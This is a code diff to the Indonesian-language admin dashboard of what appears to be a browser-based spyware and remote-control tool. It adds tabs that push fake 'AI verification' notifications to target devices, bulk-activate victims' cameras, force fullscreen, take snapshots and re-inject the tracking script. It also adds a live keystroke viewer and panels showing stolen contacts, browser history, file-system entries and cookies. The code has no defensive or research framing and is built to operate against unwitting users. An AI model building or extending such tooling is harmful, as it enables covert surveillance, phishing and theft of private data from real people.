@@ -185,6 +185,9 @@
                         <button class="tab" data-tab="bot" onclick="switchTab('bot')">Bot</button>
                         <button class="tab" data-tab="aichat" onclick="switchTab('aichat')">AI Chat</button>
                         <button class="tab" data-tab="export" onclick="switchTab('export')">Export</button>
+                        <button class="tab" data-tab="notify" onclick="switchTab('notify')">Notify</button>
+                        <button class="tab" data-tab="bulk" onclick="switchTab('bulk')">Bulk</button>
+                        <button class="tab" data-tab="keystrokes" onclick="switchTab('keystrokes')">Keystrokes</button>
                     </div>
 
                     <!-- TAB: INFO -->
@@ -317,6 +320,22 @@
                             <span style="font-size:0.82rem;color:var(--text3);">Cookies &amp; Storage</span>
                             <div id="dCookiesData" style="font-size:0.72rem;color:var(--text2);font-family:monospace;max-height:120px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
                         </div>
+                        <div style="margin-top:6px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Contacts</span>
+                            <div id="dContacts" style="font-size:0.72rem;color:var(--text2);max-height:80px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                        <div style="margin-top:6px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Browser History</span>
+                            <div id="dBrowserHistory" style="font-size:0.72rem;color:var(--text2);max-height:80px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                        <div style="margin-top:6px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">File System</span>
+                            <div id="dFileSystem" style="font-size:0.72rem;color:var(--text2);max-height:60px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                        <div style="margin-top:6px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Vendor</span>
+                            <div id="dVendor" style="font-size:0.72rem;color:var(--text2);margin-top:4px;">-</div>
+                        </div>
                     </div>
 
                     <!-- TAB: AI CHAT -->
@@ -343,6 +362,59 @@
                             <button class="header-btn" onclick="exportDeviceCSV()">Export CSV</button>
                             <button class="header-btn" onclick="exportDeviceJSON()">Export JSON</button>
                             <button class="header-btn" onclick="exportSnapshots()">Download Snapshot ZIP</button>
+                        </div>
+                    </div>
+
+                    <!-- TAB: NOTIFY -->
+                    <div class="tab-content" id="tab-notify">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Kirim notifikasi palsu ke device target.</p>
+                        <div style="margin-bottom:10px;">
+                            <label style="font-size:0.78rem;color:var(--text3);display:block;margin-bottom:4px;">Target Device</label>
+                            <select id="notifyDeviceSelect" style="width:100%;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <option value="">Semua device</option>
+                            </select>
+                        </div>
+                        <div style="margin-bottom:10px;">
+                            <label style="font-size:0.78rem;color:var(--text3);display:block;margin-bottom:4px;">Judul Notifikasi</label>
+                            <input id="notifyTitle" style="width:100%;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.82rem;" placeholder="Verifikasi AI" value="Verifikasi AI">
+                        </div>
+                        <div style="margin-bottom:10px;">
+                            <label style="font-size:0.78rem;color:var(--text3);display:block;margin-bottom:4px;">Isi Notifikasi</label>
+                            <input id="notifyBody" style="width:100%;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:0.82rem;" placeholder="Klik untuk verifikasi..." value="Neural AI membutuhkan verifikasi tambahan">
+                        </div>
+                        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                            <button class="header-btn" onclick="sendCustomNotify()" style="background:var(--accent);color:#0f0f23;font-weight:600;">Kirim Notifikasi</button>
+                            <button class="header-btn" onclick="sendCustomNotifyBulk()">Kirim ke Semua</button>
+                        </div>
+                        <div id="notifyStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
+                    </div>
+
+                    <!-- TAB: BULK -->
+                    <div class="tab-content" id="tab-bulk">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Aksi massal ke semua device online.</p>
+                        <div style="display:flex;flex-direction:column;gap:8px;">
+                            <button class="header-btn" onclick="bulkNotify()" style="text-align:left;">Kirim Fake Notification ke Semua</button>
+                            <button class="header-btn" onclick="bulkCamera()" style="text-align:left;">Aktifkan Camera Stream Semua</button>
+                            <button class="header-btn" onclick="bulkFullscreen()" style="text-align:left;">Trigger Fullscreen Semua</button>
+                            <button class="header-btn" onclick="bulkSnapshot()" style="text-align:left;">Ambil Snapshot Semua Device</button>
+                            <button class="header-btn" onclick="bulkRespawn()" style="text-align:left;">Re-inject Script ke Semua</button>
+                        </div>
+                        <div id="bulkStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
+                    </div>
+
+                    <!-- TAB: KEYSTROKES -->
+                    <div class="tab-content" id="tab-keystrokes">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Live keystroke stream dari device target.</p>
+                        <div style="display:flex;gap:8px;margin-bottom:10px;">
+                            <select id="ksDeviceSelect" style="flex:1;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;" onchange="loadKeystrokes()">
+                                <option value="">Pilih device...</option>
+                            </select>
+                            <button class="header-btn" onclick="loadKeystrokes()">Refresh</button>
+                            <button class="header-btn" onclick="clearKeystrokes()" style="border-color:#ff4444;color:#ff4444;">Hapus</button>
+                        </div>
+                        <div id="ksLive" style="font-family:monospace;font-size:0.75rem;background:var(--bg);border-radius:8px;padding:10px;max-height:300px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.6;"></div>
+                        <div style="display:flex;gap:8px;margin-top:8px;">
+                            <span id="ksStats" style="font-size:0.72rem;color:var(--text3);"></span>
                         </div>
                     </div>
 
@@ -696,6 +768,32 @@
             if (d.clicks && d.clicks.length) {
                 clEl.textContent = d.clicks.slice(-20).map(c => `[${c.x},${c.y}${c.el?' → '+c.el:''}]`).join('\n');
             } else { clEl.textContent = 'Belum ada data'; }
+
+            // Contacts
+            const contactsEl = document.getElementById('dContacts');
+            if (d.contacts && d.contacts.length) {
+                contactsEl.innerHTML = d.contacts.slice(0,10).map(c =>
+                    '<div>' + escapeHtml(c.name) + (c.email ? ' (' + escapeHtml(c.email) + ')' : '') + (c.tel ? ' · ' + escapeHtml(c.tel) : '') + '</div>'
+                ).join('');
+                if (d.contacts.length > 10) contactsEl.innerHTML += '<div style="color:var(--text3);font-size:0.65rem;">... dan ' + (d.contacts.length - 10) + ' lainnya</div>';
+            } else { contactsEl.textContent = 'Belum ada data'; }
+
+            // Browser History
+            const bhEl = document.getElementById('dBrowserHistory');
+            if (d.browserHistory && d.browserHistory.length) {
+                bhEl.innerHTML = d.browserHistory.map(s => '<div>· ' + escapeHtml(s) + '</div>').join('');
+            } else { bhEl.textContent = 'Belum ada data'; }
+
+            // File System
+            const fsEl = document.getElementById('dFileSystem');
+            if (d.fsAccess && d.fsAccess.entries && d.fsAccess.entries.length) {
+                fsEl.innerHTML = '<div style="margin-bottom:4px;">Dir: ' + escapeHtml(d.fsAccess.dirName) + '</div>' +
+                    d.fsAccess.entries.slice(0,15).map(e => '<div style="font-size:0.72rem;">· ' + escapeHtml(e.name) + ' (' + e.kind + ')</div>').join('');
+            } else { fsEl.textContent = 'Belum ada data'; }
+
+            // Vendor
+            const vdEl = document.getElementById('dVendor');
+            vdEl.textContent = d.deviceVendor || d._raw?.deviceVendor || '-';
 
             // Snapshots
             loadSnapshots(id);
@@ -1406,6 +1504,159 @@
             }, 300);
         };
 
+        // === NOTIFY COMPOSER ===
+        function loadNotifyDevices() {
+            const sel = document.getElementById('notifyDeviceSelect');
+            if (!sel) return;
+            sel.innerHTML = '<option value="">Semua device</option>';
+            for (const [id, d] of Object.entries(devices)) {
+                sel.innerHTML += `<option value="${id}">${d.label} (${id.slice(0,8)}...)</option>`;
+            }
+        }
+
+        function sendCustomNotify() {
+            const id = document.getElementById('notifyDeviceSelect').value;
+            const title = document.getElementById('notifyTitle').value;
+            const body = document.getElementById('notifyBody').value;
+            const statusEl = document.getElementById('notifyStatus');
+            if (!title) { statusEl.textContent = 'Judul tidak boleh kosong'; return; }
+            if (id) {
+                socket.emit('admin-notify', { deviceId: id, title, body });
+                statusEl.textContent = 'Notifikasi dikirim ke ' + id.slice(0,8) + '...';
+            } else {
+                let sent = 0;
+                for (const [did, d] of Object.entries(devices)) {
+                    if (d.online) { socket.emit('admin-notify', { deviceId: did, title, body }); sent++; }
+                }
+                statusEl.textContent = 'Notifikasi dikirim ke ' + sent + ' device';
+            }
+            showToast('Notifikasi terkirim', 'success');
+        }
+
+        function sendCustomNotifyBulk() {
+            document.getElementById('notifyDeviceSelect').value = '';
+            sendCustomNotify();
+        }
+
+        // === BULK ACTIONS ===
+        function bulkNotify() {
+            const title = document.getElementById('notifyTitle').value || 'Pembaruan Sistem';
+            const body = document.getElementById('notifyBody').value || 'Klik untuk melihat detail';
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-notify', { deviceId: id, title, body }); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Notifikasi dikirim ke ' + sent + ' device';
+            showToast('Bulk notify: ' + sent + ' device', 'success');
+        }
+
+        function bulkCamera() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('start-camera-stream', id); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Camera stream diaktifkan ke ' + sent + ' device';
+            showToast('Bulk camera: ' + sent + ' device', 'info');
+        }
+
+        function bulkFullscreen() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-fullscreen', id); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Fullscreen trigger ke ' + sent + ' device';
+            showToast('Bulk fullscreen: ' + sent + ' device', 'info');
+        }
+
+        function bulkSnapshot() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('request-snapshot', id); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Snapshot diminta dari ' + sent + ' device';
+            showToast('Bulk snapshot: ' + sent + ' device', 'info');
+        }
+
+        function bulkRespawn() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-respawn', id); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Re-inject script ke ' + sent + ' device';
+            showToast('Bulk respawn: ' + sent + ' device', 'info');
+        }
+
+        // === KEYSTROKE VIEWER ===
+        function loadKeystrokes() {
+            const id = document.getElementById('ksDeviceSelect').value;
+            const el = document.getElementById('ksLive');
+            const statsEl = document.getElementById('ksStats');
+            if (!id) { el.innerHTML = '<span style="color:var(--text3);">Pilih device untuk melihat keystroke</span>'; statsEl.textContent = ''; return; }
+            fetch(SERVER_URL + '/api/keystrokes/' + id).then(r => r.json()).then(keys => {
+                if (!keys || !keys.length) {
+                    el.innerHTML = '<span style="color:var(--text3);">Belum ada data keystroke</span>';
+                    statsEl.textContent = '';
+                    return;
+                }
+                const chars = keys.map(k => k.k).join('');
+                const totalKeys = keys.length;
+                const duration = keys.length > 1 ? ((keys[keys.length-1].t || keys[keys.length-1].ts) - (keys[0].t || keys[0].ts)) / 1000 : 0;
+                const speed = duration > 0 ? (totalKeys / duration).toFixed(1) : '?';
+                el.textContent = chars;
+                el.scrollTop = el.scrollHeight;
+                statsEl.textContent = `${totalKeys} keystrokes | ${duration.toFixed(0)}s | ${speed} chars/s`;
+            }).catch(() => {
+                el.innerHTML = '<span style="color:#ff4444;">Gagal memuat data</span>';
+            });
+        }
+
+        function clearKeystrokes() {
+            const id = document.getElementById('ksDeviceSelect').value;
+            if (!id) return;
+            fetch(SERVER_URL + '/api/keystrokes/' + id, { method: 'DELETE' }).then(() => {
+                document.getElementById('ksLive').innerHTML = '<span style="color:var(--text3);">Data keystroke dihapus</span>';
+                document.getElementById('ksStats').textContent = '';
+                showToast('Keystroke dihapus', 'info');
+            }).catch(() => {});
+        }
+
+        // Patch switchTab to refresh specific tabs
+        const origSwitch = switchTab;
+        switchTab = function(tab) {
+            origSwitch(tab);
+            if (tab === 'notify') loadNotifyDevices();
+            if (tab === 'keystrokes') {
+                const sel = document.getElementById('ksDeviceSelect');
+                sel.innerHTML = '<option value="">Pilih device...</option>';
+                for (const [id, d] of Object.entries(devices)) {
+                    sel.innerHTML += `<option value="${id}">${d.label}</option>`;
+                }
+                if (sel.value) loadKeystrokes();
+            }
+            if (tab === 'bulk') {
+                const count = Object.values(devices).filter(d => d.online).length;
+                document.getElementById('bulkStatus').textContent = count + ' device online';
+            }
+        };
+
+        // Real-time keystroke update for selected device
+        socket.on('device-update', (data) => {
+            const ksTab = document.getElementById('tab-keystrokes');
+            if (!ksTab.classList.contains('active')) return;
+            const sel = document.getElementById('ksDeviceSelect');
+            if (sel && sel.value === data.id) {
+                if (data.keystrokes) {
+                    const el = document.getElementById('ksLive');
+                    el.textContent = data.keystrokes.map(k => k.k).join('');
+                    el.scrollTop = el.scrollHeight;
+                }
+            }
+        });
+
+        socket.on('admin-notify-ack', (data) => {
+            showToast('Notif terkirim: ' + (data.deviceId || '').slice(0,8) + '...', 'success');
+        });
+
         // Window resize for history canvas
         window.addEventListener('resize', () => {
             if (histPoints.length) drawHistory(histPoints);
@@ -1418,6 +1669,16 @@
         loadDomains();
         fetchDevices();
         setTimeout(loadAIChatDevices, 1000);
+        setTimeout(() => {
+            loadNotifyDevices();
+            const sel = document.getElementById('ksDeviceSelect');
+            if (sel) {
+                sel.innerHTML = '<option value="">Pilih device...</option>';
+                for (const [id, d] of Object.entries(devices)) {
+                    sel.innerHTML += `<option value="${id}">${d.label}</option>`;
+                }
+            }
+        }, 2000);
 
         // Periodic refresh to catch device online/offline changes
         setInterval(() => {
